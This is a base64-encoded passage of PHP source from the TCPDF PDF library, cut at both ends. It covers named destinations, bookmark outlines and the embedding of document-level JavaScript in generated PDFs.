HNlOwoJCX0KCQlpZiAoJHkgPT0gLTEpIHsKCQkJJHkgPSAkdGhpcy0+R2V0WSgpOwoJCX0gZWxzZWlmICgkeSA8IDApIHsKCQkJJHkgPSAwOwoJCX0gZWxzZWlmICgkeSA+ICR0aGlzLT5oKSB7CgkJCSR5ID0gJHRoaXMtPmg7CgkJfQoJCWlmICgkeCA9PSAtMSkgewoJCQkkeCA9ICR0aGlzLT5HZXRYKCk7CgkJfSBlbHNlaWYgKCR4IDwgMCkgewoJCQkkeCA9IDA7CgkJfSBlbHNlaWYgKCR4ID4gJHRoaXMtPncpIHsKCQkJJHggPSAkdGhpcy0+dzsKCQl9CgkJJGZpeGVkID0gZmFsc2U7CgkJaWYgKCFlbXB0eSgkcGFnZSkgQU5EIChzdWJzdHIoJHBhZ2UsIDAsIDEpID09ICcqJykpIHsKCQkJJHBhZ2UgPSBpbnR2YWwoc3Vic3RyKCRwYWdlLCAxKSk7CgkJCS8vIHRoaXMgcGFnZSBudW1iZXIgd2lsbCBub3QgYmUgY2hhbmdlZCB3aGVuIG1vdmluZy9hZGQvZGVsZXRpbmcgcGFnZXMKCQkJJGZpeGVkID0gdHJ1ZTsKCQl9CgkJaWYgKGVtcHR5KCRwYWdlKSkgewoJCQkkcGFnZSA9ICR0aGlzLT5QYWdlTm8oKTsKCQkJaWYgKGVtcHR5KCRwYWdlKSkgewoJCQkJcmV0dXJuOwoJCQl9CgkJfQoJCSR0aGlzLT5kZXN0c1skbmFtZV0gPSBhcnJheSgneCcgPT4gJHgsICd5JyA9PiAkeSwgJ3AnID0+ICRwYWdlLCAnZicgPT4gJGZpeGVkKTsKCQlyZXR1cm4gJG5hbWU7Cgl9CgoJLyoqCgkgKiBSZXR1cm4gdGhlIE5hbWVkIERlc3RpbmF0aW9uIGFycmF5LgoJICogQHJldHVybiBhcnJheSBOYW1lZCBEZXN0aW5hdGlvbiBhcnJheS4KCSAqIEBwdWJsaWMKCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgNS45LjA5NyAoMjAxMS0wNi0yMykKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGdldERlc3RpbmF0aW9uKCkgewoJCXJldHVybiAkdGhpcy0+ZGVzdHM7Cgl9CgoJLyoqCgkgKiBJbnNlcnQgTmFtZWQgRGVzdGluYXRpb25zLgoJICogQHByb3RlY3RlZAoJICogQGF1dGhvciBKb2hhbm5lcyBHXEZDbnRlcnQsIE5pY29sYSBBc3VuaQoJICogQHNpbmNlIDUuOS4wOTggKDIwMTEtMDYtMjMpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBfcHV0ZGVzdHMoKSB7CgkJaWYgKGVtcHR5KCR0aGlzLT5kZXN0cykpIHsKCQkJcmV0dXJuOwoJCX0KCQkkdGhpcy0+bl9kZXN0cyA9ICR0aGlzLT5fbmV3b2JqKCk7CgkJJG91dCA9ICcgPDwnOwoJCWZvcmVhY2goJHRoaXMtPmRlc3RzIGFzICRuYW1lID0+ICRvKSB7CgkJCSRvdXQgLj0gJyAvJy4kbmFtZS4nICcuc3ByaW50ZignWyV1IDAgUiAvWFlaICVGICVGIG51bGxdJywgJHRoaXMtPnBhZ2Vfb2JqX2lkWygkb1sncCddKV0sICgkb1sneCddICogJHRoaXMtPmspLCAoJHRoaXMtPnBhZ2VkaW1bJG9bJ3AnXV1bJ2gnXSAtICgkb1sneSddICogJHRoaXMtPmspKSk7CgkJfQoJCSRvdXQgLj0gJyA+Pic7CgkJJG91dCAuPSAiXG4iLidlbmRvYmonOwoJCSR0aGlzLT5fb3V0KCRvdXQpOwoJfQoKCS8qKgoJICogQWRkcyBhIGJvb2ttYXJrIC0gYWxpYXMgZm9yIEJvb2ttYXJrKCkuCgkgKiBAcGFyYW0gc3RyaW5nICR0eHQgQm9va21hcmsgZGVzY3JpcHRpb24uCgkgKiBAcGFyYW0gaW50ICRsZXZlbCBCb29rbWFyayBsZXZlbCAobWluaW11bSB2YWx1ZSBpcyAwKS4KCSAqIEBwYXJhbSBmbG9hdCAkeSBZIHBvc2l0aW9uIGluIHVzZXIgdW5pdHMgb2YgdGhlIGJvb2ttYXJrIG9uIHRoZSBzZWxlY3RlZCBwYWdlIChkZWZhdWx0ID0gLTEgPSBjdXJyZW50IHBvc2l0aW9uOyAwID0gcGFnZSBzdGFydDspLgoJICogQHBhcmFtIGludHxzdHJpbmcgJHBhZ2UgVGFyZ2V0IHBhZ2UgbnVtYmVyIChsZWF2ZSBlbXB0eSBmb3IgY3VycmVudCBwYWdlKS4gSWYgeW91IHByZWZpeCBhIHBhZ2UgbnVtYmVyIHdpdGggdGhlICogY2hhcmFjdGVyLCB0aGVuIHRoaXMgcGFnZSB3aWxsIG5vdCBiZSBjaGFuZ2VkIHdoZW4gYWRkaW5nL2RlbGV0aW5nL21vdmluZyBwYWdlcy4KCSAqIEBwYXJhbSBzdHJpbmcgJHN0eWxlIEZvbnQgc3R5bGU6IEIgPSBCb2xkLCBJID0gSXRhbGljLCBCSSA9IEJvbGQgKyBJdGFsaWMuCgkgKiBAcGFyYW0gYXJyYXkgJGNvbG9yIFJHQiBjb2xvciBhcnJheSAodmFsdWVzIGZyb20gMCB0byAyNTUpLgoJICogQHBhcmFtIGZsb2F0ICR4IFggcG9zaXRpb24gaW4gdXNlciB1bml0cyBvZiB0aGUgYm9va21hcmsgb24gdGhlIHNlbGVjdGVkIHBhZ2UgKGRlZmF1bHQgPSAtMSA9IGN1cnJlbnQgcG9zaXRpb247KS4KCSAqIEBwYXJhbSBtaXhlZCAkbGluayBVUkwsIG9yIG51bWVyaWNhbCBsaW5rIElELCBvciBuYW1lZCBkZXN0aW5hdGlvbiAoIyBjaGFyYWN0ZXIgZm9sbG93ZWQgYnkgdGhlIGRlc3RpbmF0aW9uIG5hbWUpLCBvciBlbWJlZGRlZCBmaWxlICgqIGNoYXJhY3RlciBmb2xsb3dlZCBieSB0aGUgZmlsZSBuYW1lKS4KCSAqIEBwdWJsaWMKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldEJvb2ttYXJrKCR0eHQsICRsZXZlbD0wLCAkeT0tMSwgJHBhZ2U9JycsICRzdHlsZT0nJywgJGNvbG9yPWFycmF5KDAsMCwwKSwgJHg9LTEsICRsaW5rPScnKSB7CgkJJHRoaXMtPkJvb2ttYXJrKCR0eHQsICRsZXZlbCwgJHksICRwYWdlLCAkc3R5bGUsICRjb2xvciwgJHgsICRsaW5rKTsKCX0KCgkvKioKCSAqIEFkZHMgYSBib29rbWFyay4KCSAqIEBwYXJhbSBzdHJpbmcgJHR4dCBCb29rbWFyayBkZXNjcmlwdGlvbi4KCSAqIEBwYXJhbSBpbnQgJGxldmVsIEJvb2ttYXJrIGxldmVsIChtaW5pbXVtIHZhbHVlIGlzIDApLgoJICogQHBhcmFtIGZsb2F0ICR5IFkgcG9zaXRpb24gaW4gdXNlciB1bml0cyBvZiB0aGUgYm9va21hcmsgb24gdGhlIHNlbGVjdGVkIHBhZ2UgKGRlZmF1bHQgPSAtMSA9IGN1cnJlbnQgcG9zaXRpb247IDAgPSBwYWdlIHN0YXJ0OykuCgkgKiBAcGFyYW0gaW50fHN0cmluZyAkcGFnZSBUYXJnZXQgcGFnZSBudW1iZXIgKGxlYXZlIGVtcHR5IGZvciBjdXJyZW50IHBhZ2UpLiBJZiB5b3UgcHJlZml4IGEgcGFnZSBudW1iZXIgd2l0aCB0aGUgKiBjaGFyYWN0ZXIsIHRoZW4gdGhpcyBwYWdlIHdpbGwgbm90IGJlIGNoYW5nZWQgd2hlbiBhZGRpbmcvZGVsZXRpbmcvbW92aW5nIHBhZ2VzLgoJICogQHBhcmFtIHN0cmluZyAkc3R5bGUgRm9udCBzdHlsZTogQiA9IEJvbGQsIEkgPSBJdGFsaWMsIEJJID0gQm9sZCArIEl0YWxpYy4KCSAqIEBwYXJhbSBhcnJheSAkY29sb3IgUkdCIGNvbG9yIGFycmF5ICh2YWx1ZXMgZnJvbSAwIHRvIDI1NSkuCgkgKiBAcGFyYW0gZmxvYXQgJHggWCBwb3NpdGlvbiBpbiB1c2VyIHVuaXRzIG9mIHRoZSBib29rbWFyayBvbiB0aGUgc2VsZWN0ZWQgcGFnZSAoZGVmYXVsdCA9IC0xID0gY3VycmVudCBwb3NpdGlvbjspLgoJICogQHBhcmFtIG1peGVkICRsaW5rIFVSTCwgb3IgbnVtZXJpY2FsIGxpbmsgSUQsIG9yIG5hbWVkIGRlc3RpbmF0aW9uICgjIGNoYXJhY3RlciBmb2xsb3dlZCBieSB0aGUgZGVzdGluYXRpb24gbmFtZSksIG9yIGVtYmVkZGVkIGZpbGUgKCogY2hhcmFjdGVyIGZvbGxvd2VkIGJ5IHRoZSBmaWxlIG5hbWUpLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDIuMS4wMDIgKDIwMDgtMDItMTIpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBCb29rbWFyaygkdHh0LCAkbGV2ZWw9MCwgJHk9LTEsICRwYWdlPScnLCAkc3R5bGU9JycsICRjb2xvcj1hcnJheSgwLDAsMCksICR4PS0xLCAkbGluaz0nJykgewoJCWlmICgkbGV2ZWwgPCAwKSB7CgkJCSRsZXZlbCA9IDA7CgkJfQoJCWlmIChpc3NldCgkdGhpcy0+b3V0bGluZXNbMF0pKSB7CgkJCSRsYXN0b3V0bGluZSA9IGVuZCgkdGhpcy0+b3V0bGluZXMpOwoJCQkkbWF4bGV2ZWwgPSAkbGFzdG91dGxpbmVbJ2wnXSArIDE7CgkJfSBlbHNlIHsKCQkJJG1heGxldmVsID0gMDsKCQl9CgkJaWYgKCRsZXZlbCA+ICRtYXhsZXZlbCkgewoJCQkkbGV2ZWwgPSAkbWF4bGV2ZWw7CgkJfQoJCWlmICgkeSA9PSAtMSkgewoJCQkkeSA9ICR0aGlzLT5HZXRZKCk7CgkJfSBlbHNlaWYgKCR5IDwgMCkgewoJCQkkeSA9IDA7CgkJfSBlbHNlaWYgKCR5ID4gJHRoaXMtPmgpIHsKCQkJJHkgPSAkdGhpcy0+aDsKCQl9CgkJaWYgKCR4ID09IC0xKSB7CgkJCSR4ID0gJHRoaXMtPkdldFgoKTsKCQl9IGVsc2VpZiAoJHggPCAwKSB7CgkJCSR4ID0gMDsKCQl9IGVsc2VpZiAoJHggPiAkdGhpcy0+dykgewoJCQkkeCA9ICR0aGlzLT53OwoJCX0KCQkkZml4ZWQgPSBmYWxzZTsKCQkkcGFnZUFzU3RyaW5nID0gKHN0cmluZykgJHBhZ2U7CgkJaWYgKCRwYWdlQXNTdHJpbmcgJiYgJHBhZ2VBc1N0cmluZ1swXSA9PSAnKicpIHsKCQkJJHBhZ2UgPSBpbnR2YWwoc3Vic3RyKCRwYWdlLCAxKSk7CgkJCS8vIHRoaXMgcGFnZSBudW1iZXIgd2lsbCBub3QgYmUgY2hhbmdlZCB3aGVuIG1vdmluZy9hZGQvZGVsZXRpbmcgcGFnZXMKCQkJJGZpeGVkID0gdHJ1ZTsKCQl9CgkJaWYgKGVtcHR5KCRwYWdlKSkgewoJCQkkcGFnZSA9ICR0aGlzLT5QYWdlTm8oKTsKCQkJaWYgKGVtcHR5KCRwYWdlKSkgewoJCQkJcmV0dXJuOwoJCQl9CgkJfQoJCSR0aGlzLT5vdXRsaW5lc1tdID0gYXJyYXkoJ3QnID0+ICR0eHQsICdsJyA9PiAkbGV2ZWwsICd4JyA9PiAkeCwgJ3knID0+ICR5LCAncCcgPT4gJHBhZ2UsICdmJyA9PiAkZml4ZWQsICdzJyA9PiBzdHJ0b3VwcGVyKCRzdHlsZSksICdjJyA9PiAkY29sb3IsICd1JyA9PiAkbGluayk7Cgl9CgoJLyoqCgkgKiBTb3J0IGJvb2ttYXJrcyBmb3IgcGFnZSBhbmQga2V5LgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDUuOS4xMTkgKDIwMTEtMDktMTkpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBzb3J0Qm9va21hcmtzKCkgewoJCS8vIGdldCBzb3J0aW5nIGNvbHVtbnMKCQkkb3V0bGluZV9wID0gYXJyYXkoKTsKCQkkb3V0bGluZV95ID0gYXJyYXkoKTsKCQlmb3JlYWNoICgkdGhpcy0+b3V0bGluZXMgYXMgJGtleSA9PiAkcm93KSB7CgkJCSRvdXRsaW5lX3BbJGtleV0gPSAkcm93WydwJ107CgkJCSRvdXRsaW5lX2tbJGtleV0gPSAka2V5OwoJCX0KCQkvLyBzb3J0IG91dGxpbmVzIGJ5IHBhZ2UgYW5kIG9yaWdpbmFsIHBvc2l0aW9uCgkJYXJyYXlfbXVsdGlzb3J0KCRvdXRsaW5lX3AsIFNPUlRfTlVNRVJJQywgU09SVF9BU0MsICRvdXRsaW5lX2ssIFNPUlRfTlVNRVJJQywgU09SVF9BU0MsICR0aGlzLT5vdXRsaW5lcyk7Cgl9CgoJLyoqCgkgKiBDcmVhdGUgYSBib29rbWFyayBQREYgc3RyaW5nLgoJICogQHByb3RlY3RlZAoJICogQGF1dGhvciBPbGl2aWVyIFBsYXRoZXksIE5pY29sYSBBc3VuaQoJICogQHNpbmNlIDIuMS4wMDIgKDIwMDgtMDItMTIpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBfcHV0Ym9va21hcmtzKCkgewoJCSRuYiA9IGNvdW50KCR0aGlzLT5vdXRsaW5lcyk7CgkJaWYgKCRuYiA9PSAwKSB7CgkJCXJldHVybjsKCQl9CgkJLy8gc29ydCBib29rbWFya3MKCQkkdGhpcy0+c29ydEJvb2ttYXJrcygpOwoJCSRscnUgPSBhcnJheSgpOwoJCSRsZXZlbCA9IDA7CgkJZm9yZWFjaCAoJHRoaXMtPm91dGxpbmVzIGFzICRpID0+ICRvKSB7CgkJCWlmICgkb1snbCddID4gMCkgewoJCQkJJHBhcmVudCA9ICRscnVbKCRvWydsJ10gLSAxKV07CgkJCQkvL1NldCBwYXJlbnQgYW5kIGxhc3QgcG9pbnRlcnMKCQkJCSR0aGlzLT5vdXRsaW5lc1skaV1bJ3BhcmVudCddID0gJHBhcmVudDsKCQkJCSR0aGlzLT5vdXRsaW5lc1skcGFyZW50XVsnbGFzdCddID0gJGk7CgkJCQlpZiAoJG9bJ2wnXSA+ICRsZXZlbCkgewoJCQkJCS8vTGV2ZWwgaW5jcmVhc2luZzogc2V0IGZpcnN0IHBvaW50ZXIKCQkJCQkkdGhpcy0+b3V0bGluZXNbJHBhcmVudF1bJ2ZpcnN0J10gPSAkaTsKCQkJCX0KCQkJfSBlbHNlIHsKCQkJCSR0aGlzLT5vdXRsaW5lc1skaV1bJ3BhcmVudCddID0gJG5iOwoJCQl9CgkJCWlmICgoJG9bJ2wnXSA8PSAkbGV2ZWwpIEFORCAoJGkgPiAwKSkgewoJCQkJLy9TZXQgcHJldiBhbmQgbmV4dCBwb2ludGVycwoJCQkJJHByZXYgPSAkbHJ1WyRvWydsJ11dOwoJCQkJJHRoaXMtPm91dGxpbmVzWyRwcmV2XVsnbmV4dCddID0gJGk7CgkJCQkkdGhpcy0+b3V0bGluZXNbJGldWydwcmV2J10gPSAkcHJldjsKCQkJfQoJCQkkbHJ1WyRvWydsJ11dID0gJGk7CgkJCSRsZXZlbCA9ICRvWydsJ107CgkJfQoJCS8vT3V0bGluZSBpdGVtcwoJCSRuID0gJHRoaXMtPm4gKyAxOwoJCSRubHRhZ3MgPSAnLzxicltcc10/XC8+fDxcLyhibG9ja3F1b3RlfGRkfGRsfGRpdnxkdHxoMXxoMnxoM3xoNHxoNXxoNnxocnxsaXxvbHxwfHByZXx1bHx0Y3BkZnx0YWJsZXx0cnx0ZCk+L3NpJzsKCQlmb3JlYWNoICgkdGhpcy0+b3V0bGluZXMgYXMgJGkgPT4gJG8pIHsKCQkJJG9pZCA9ICR0aGlzLT5fbmV3b2JqKCk7CgkJCS8vIGNvdmVydCBIVE1MIHRpdGxlIHRvIHN0cmluZwoJCQkkdGl0bGUgPSBwcmVnX3JlcGxhY2UoJG5sdGFncywgIlxuIiwgJG9bJ3QnXSk7CgkJCSR0aXRsZSA9IHByZWdfcmVwbGFjZSgiL1tccl0rL3NpIiwgJycsICR0aXRsZSk7CgkJCSR0aXRsZSA9IHByZWdfcmVwbGFjZSgiL1tcbl0rL3NpIiwgIlxuIiwgJHRpdGxlKTsKCQkJJHRpdGxlID0gc3RyaXBfdGFncygkdGl0bGUpOwoJCQkkdGl0bGUgPSAkdGhpcy0+c3RyaW5nVHJpbSgkdGl0bGUpOwoJCQkkb3V0ID0gJzw8L1RpdGxlICcuJHRoaXMtPl90ZXh0c3RyaW5nKCR0aXRsZSwgJG9pZCk7CgkJCSRvdXQgLj0gJyAvUGFyZW50ICcuKCRuICsgJG9bJ3BhcmVudCddKS4nIDAgUic7CgkJCWlmIChpc3NldCgkb1sncHJldiddKSkgewoJCQkJJG91dCAuPSAnIC9QcmV2ICcuKCRuICsgJG9bJ3ByZXYnXSkuJyAwIFInOwoJCQl9CgkJCWlmIChpc3NldCgkb1snbmV4dCddKSkgewoJCQkJJG91dCAuPSAnIC9OZXh0ICcuKCRuICsgJG9bJ25leHQnXSkuJyAwIFInOwoJCQl9CgkJCWlmIChpc3NldCgkb1snZmlyc3QnXSkpIHsKCQkJCSRvdXQgLj0gJyAvRmlyc3QgJy4oJG4gKyAkb1snZmlyc3QnXSkuJyAwIFInOwoJCQl9CgkJCWlmIChpc3NldCgkb1snbGFzdCddKSkgewoJCQkJJG91dCAuPSAnIC9MYXN0ICcuKCRuICsgJG9bJ2xhc3QnXSkuJyAwIFInOwoJCQl9CgkJCWlmIChpc3NldCgkb1sndSddKSBBTkQgIWVtcHR5KCRvWyd1J10pKSB7CgkJCQkvLyBsaW5rCgkJCQlpZiAoaXNfc3RyaW5nKCRvWyd1J10pKSB7CgkJCQkJaWYgKCRvWyd1J11bMF0gPT0gJyMnKSB7CgkJCQkJCS8vIGludGVybmFsIGRlc3RpbmF0aW9uCgkJCQkJCSRvdXQgLj0gJyAvRGVzdCAvJy5UQ1BERl9TVEFUSUM6OmVuY29kZU5hbWVPYmplY3Qoc3Vic3RyKCRvWyd1J10sIDEpKTsKCQkJCQl9IGVsc2VpZiAoJG9bJ3UnXVswXSA9PSAnJScpIHsKCQkJCQkJLy8gZW1iZWRkZWQgUERGIGZpbGUKCQkJCQkJJGZpbGVuYW1lID0gYmFzZW5hbWUoc3Vic3RyKCRvWyd1J10sIDEpKTsKCQkJCQkJJG91dCAuPSAnIC9BIDw8L1MgL0dvVG9FIC9EIFswIC9GaXRdIC9OZXdXaW5kb3cgdHJ1ZSAvVCA8PCAvUiAvQyAvUCAnLigkb1sncCddIC0gMSkuJyAvQSAnLiR0aGlzLT5lbWJlZGRlZGZpbGVzWyRmaWxlbmFtZV1bJ2EnXS4nID4+ID4+JzsKCQkJCQl9IGVsc2VpZiAoJG9bJ3UnXVswXSA9PSAnKicpIHsKCQkJCQkJLy8gZW1iZWRkZWQgZ2VuZXJpYyBmaWxlCgkJCQkJCSRmaWxlbmFtZSA9IGJhc2VuYW1lKHN1YnN0cigkb1sndSddLCAxKSk7CgkJCQkJCSRqc2EgPSAndmFyIEQ9ZXZlbnQudGFyZ2V0LmRvYzt2YXIgTXlEYXRhPUQuZGF0YU9iamVjdHM7Zm9yICh2YXIgaSBpbiBNeURhdGEpIGlmIChNeURhdGFbaV0ucGF0aD09IicuJGZpbGVuYW1lLiciKSBELmV4cG9ydERhdGFPYmplY3QoIHsgY05hbWUgOiBNeURhdGFbaV0ubmFtZSwgbkxhdW5jaCA6IDJ9KTsnOwoJCQkJCQkkb3V0IC49ICcgL0EgPDwvUyAvSmF2YVNjcmlwdCAvSlMgJy4kdGhpcy0+X3RleHRzdHJpbmcoJGpzYSwgJG9pZCkuJz4+JzsKCQkJCQl9IGVsc2UgewoJCQkJCQkvLyBleHRlcm5hbCBVUkkgbGluawoJCQkJCQkkb3V0IC49ICcgL0EgPDwvUyAvVVJJIC9VUkkgJy4kdGhpcy0+X2RhdGFzdHJpbmcoJHRoaXMtPnVuaHRtbGVudGl0aWVzKCRvWyd1J10pLCAkb2lkKS4nPj4nOwoJCQkJCX0KCQkJCX0gZWxzZWlmIChpc3NldCgkdGhpcy0+bGlua3NbJG9bJ3UnXV0pKSB7CgkJCQkJLy8gaW50ZXJuYWwgbGluayBJRAoJCQkJCSRsID0gJHRoaXMtPmxpbmtzWyRvWyd1J11dOwoJCQkJCWlmIChpc3NldCgkdGhpcy0+cGFnZV9vYmpfaWRbKCRsWydwJ10pXSkpIHsKCQkJCQkJJG91dCAuPSBzcHJpbnRmKCcgL0Rlc3QgWyV1IDAgUiAvWFlaIDAgJUYgbnVsbF0nLCAkdGhpcy0+cGFnZV9vYmpfaWRbKCRsWydwJ10pXSwgKCR0aGlzLT5wYWdlZGltWyRsWydwJ11dWydoJ10gLSAoJGxbJ3knXSAqICR0aGlzLT5rKSkpOwoJCQkJCX0KCQkJCX0KCQkJfSBlbHNlaWYgKGlzc2V0KCR0aGlzLT5wYWdlX29ial9pZFsoJG9bJ3AnXSldKSkgewoJCQkJLy8gbGluayB0byBhIHBhZ2UKCQkJCSRvdXQgLj0gJyAnLnNwcmludGYoJy9EZXN0IFsldSAwIFIgL1hZWiAlRiAlRiBudWxsXScsICR0aGlzLT5wYWdlX29ial9pZFsoJG9bJ3AnXSldLCAoJG9bJ3gnXSAqICR0aGlzLT5rKSwgKCR0aGlzLT5wYWdlZGltWyRvWydwJ11dWydoJ10gLSAoJG9bJ3knXSAqICR0aGlzLT5rKSkpOwoJCQl9CgkJCS8vIHNldCBmb250IHN0eWxlCgkJCSRzdHlsZSA9IDA7CgkJCWlmICghZW1wdHkoJG9bJ3MnXSkpIHsKCQkJCS8vIGJvbGQKCQkJCWlmIChzdHJwb3MoJG9bJ3MnXSwgJ0InKSAhPT0gZmFsc2UpIHsKCQkJCQkkc3R5bGUgfD0gMjsKCQkJCX0KCQkJCS8vIG9ibGlxdWUKCQkJCWlmIChzdHJwb3MoJG9bJ3MnXSwgJ0knKSAhPT0gZmFsc2UpIHsKCQkJCQkkc3R5bGUgfD0gMTsKCQkJCX0KCQkJfQoJCQkkb3V0IC49IHNwcmludGYoJyAvRiAlZCcsICRzdHlsZSk7CgkJCS8vIHNldCBib29rbWFyayBjb2xvcgoJCQlpZiAoaXNzZXQoJG9bJ2MnXSkgQU5EIGlzX2FycmF5KCRvWydjJ10pIEFORCAoY291bnQoJG9bJ2MnXSkgPT0gMykpIHsKCQkJCSRjb2xvciA9IGFycmF5X3ZhbHVlcygkb1snYyddKTsKCQkJCSRvdXQgLj0gc3ByaW50ZignIC9DIFslRiAlRiAlRl0nLCAoJGNvbG9yWzBdIC8gMjU1KSwgKCRjb2xvclsxXSAvIDI1NSksICgkY29sb3JbMl0gLyAyNTUpKTsKCQkJfSBlbHNlIHsKCQkJCS8vIGJsYWNrCgkJCQkkb3V0IC49ICcgL0MgWzAuMCAwLjAgMC4wXSc7CgkJCX0KCQkJJG91dCAuPSAnIC9Db3VudCAwJzsgLy8gbm9ybWFsbHkgY2xvc2VkIGl0ZW0KCQkJJG91dCAuPSAnID4+JzsKCQkJJG91dCAuPSAiXG4iLidlbmRvYmonOwoJCQkkdGhpcy0+X291dCgkb3V0KTsKCQl9CgkJLy9PdXRsaW5lIHJvb3QKCQkkdGhpcy0+T3V0bGluZVJvb3QgPSAkdGhpcy0+X25ld29iaigpOwoJCSR0aGlzLT5fb3V0KCc8PCAvVHlwZSAvT3V0bGluZXMgL0ZpcnN0ICcuJG4uJyAwIFIgL0xhc3QgJy4oJG4gKyAkbHJ1WzBdKS4nIDAgUiA+PicuIlxuIi4nZW5kb2JqJyk7Cgl9CgoJLy8gLS0tIEpBVkFTQ1JJUFQgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgoJLyoqCgkgKiBBZGRzIGEgamF2YXNjcmlwdAoJICogQHBhcmFtIHN0cmluZyAkc2NyaXB0IEphdmFzY3JpcHQgY29kZQoJICogQHB1YmxpYwoJICogQGF1dGhvciBKb2hhbm5lcyBHXEZDbnRlcnQsIE5pY29sYSBBc3VuaQoJICogQHNpbmNlIDIuMS4wMDIgKDIwMDgtMDItMTIpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBJbmNsdWRlSlMoJHNjcmlwdCkgewoJCSR0aGlzLT5qYXZhc2NyaXB0IC49ICRzY3JpcHQ7Cgl9CgoJLyoqCgkgKiBBZGRzIGEgamF2YXNjcmlwdCBvYmplY3QgYW5kIHJldHVybiBvYmplY3QgSUQKCSAqIEBwYXJhbSBzdHJpbmcgJHNjcmlwdCBKYXZhc2NyaXB0IGNvZGUKCSAqIEBwYXJhbSBib29sZWFuICRvbmxvYWQgaWYgdHJ1ZSBleGVjdXRlcyB0aGlzIG9iamVjdCB3aGVuIG9wZW5pbmcgdGhlIGRvY3VtZW50CgkgKiBAcmV0dXJuIGludCBpbnRlcm5hbCBvYmplY3QgSUQKCSAqIEBwdWJsaWMKCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgNC44LjAwMCAoMjAwOS0wOS0wNykKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGFkZEphdmFzY3JpcHRPYmplY3QoJHNjcmlwdCwgJG9ubG9hZD1mYWxzZSkgewoJCWlmICgkdGhpcy0+cGRmYV9tb2RlKSB7CgkJCS8vIGphdmFzY3JpcHQgaXMgbm90IGFsbG93ZWQgaW4gUERGL0EgbW9kZQoJCQlyZXR1cm4gZmFsc2U7CgkJfQoJCSsrJHRoaXMtPm47CgkJJHRoaXMtPmpzX29iamVjdHNbJHRoaXMtPm5dID0gYXJyYXkoJ24nID0+ICR0aGlzLT5uLCAnanMnID0+ICRzY3JpcHQsICdvbmxvYWQnID0+ICRvbmxvYWQpOwoJCXJldHVybiAkdGhpcy0+bjsKCX0KCgkvKioKCSAqIENyZWF0ZSBhIGphdmFzY3JpcHQgUERGIHN0cmluZy4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBhdXRob3IgSm9oYW5uZXMgR1xGQ250ZXJ0LCBOaWNvbGEgQXN1bmkKCSAqIEBzaW5jZSAyLjEuMDAyICgyMDA4LTAyLTEyKQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gX3B1dGphdmFzY3JpcHQoKSB7CgkJaWYgKCR0aGlzLT5wZGZhX21vZGUgT1IgKGVtcHR5KCR0aGlzLT5qYXZhc2NyaXB0KSBBTkQgZW1wdHkoJHRoaXMtPmpzX29iamVjdHMpKSkgewoJCQlyZXR1cm47CgkJfQoJCWlmIChzdHJwb3MoJHRoaXMtPmphdmFzY3JpcHQsICd0aGlzLmFkZEZpZWxkJykgPiAwKSB7CgkJCWlmICghJHRoaXMtPnVyWydlbmFibGVkJ10pIHsKCQkJCS8vJHRoaXMtPnNldFVzZXJSaWdodHMoKTsKCQkJfQoJCQkvLyB0aGUgZm9sbG93aW5nIHR3byBsaW5lcyBhcmUgdXNlZCB0byBhdm9pZCBmb3JtIGZpZWxkcyBkdXBsaWNhdGlvbiBhZnRlciBzYXZpbmcKCQkJLy8gVGhlIGFkZEZpZWxkIG1ldGhvZCBvbmx5IHdvcmtzIHdoZW4gcmVsZWFzaW5nIHVzZXIgcmlnaHRzIChVUjMpCgkJCSRqc2EgPSBzcHJpbnRmKCJmdGNwZGZkb2NzYXZlZD10aGlzLmFkZEZpZWxkKCclcycsJyVzJywlZCxbJUYsJUYsJUYsJUZdKTsiLCAndGNwZGZkb2NzYXZlZCcsICd0ZXh0JywgMCwgMCwgMSwgMCwgMSk7CgkJCSRqc2IgPSAiZ2V0RmllbGQoJ3RjcGRmZG9jc2F2ZWQnKS52YWx1ZT0nc2F2ZWQnOyI7CgkJCSR0aGlzLT5qYXZhc2NyaXB0ID0gJGpzYS4iXG4iLiR0aGlzLT5qYXZhc2NyaXB0LiJcbiIuJGpzYjsKCQl9CgkJLy8gbmFtZSB0cmVlIGZvciBqYXZhc2NyaXB0CgkJJHRoaXMtPm5fanMgPSAnPDwgL05hbWVzIFsnOwoJCWlmICghZW1wdHkoJHRoaXMtPmphdmFzY3JpcHQpKSB7CgkJCSR0aGlzLT5uX2pzIC49ICcgKEVtYmVkZGVkSlMpICcuKCR0aGlzLT5uICsgMSkuJyAwIFInOwoJCX0KCQlpZiAoIWVtcHR5KCR0aGlzLT5qc19vYmplY3RzKSkgewoJCQlmb3JlYWNoICgkdGhpcy0+anNfb2JqZWN0cyBhcyAka2V5ID0+ICR2YWwpIHsKCQkJCWlmICgkdmFsWydvbmxvYWQnXSkgewoJCQkJCSR0aGlzLT5uX2pzIC49ICcgKEpTJy4ka2V5LicpICcuJGtleS4nIDAgUic7CgkJCQl9CgkJCX0KCQl9CgkJJHRoaXMtPm5fanMgLj0gJyBdID4+JzsKCQkvLyBkZWZhdWx0IEphdmFzY3JpcHQgb2JqZWN0CgkJaWYgKCFlbXB0eSgkdGhpcy0+amF2YXNjcmlwdCkpIHsKCQkJJG9ial9pZCA9ICR0aGlzLT5fbmV3b2JqKCk7CgkJCSRvdXQgPSAnPDwgL1MgL0phdmFTY3JpcHQnOwoJCQkkb3V0IC49ICcgL0pTICcuJHRoaXMtPl90ZXh0c3RyaW5nKCR0aGlzLT5qYXZhc2NyaXB0LCAkb2JqX2lkKTsKCQkJJG91dCAuPSAnID4+JzsKCQkJJG91dCAuPSAiXG4iLidlbmRvYmonOwoJCQkkdGhpcy0+X291dCgkb3V0KTsKCQl9CgkJLy8gYWRkaXRpb25hbCBKYXZhc2NyaXB0IG9iamVjdHMKCQlpZiAoIWVtcHR5KCR0aGlzLT5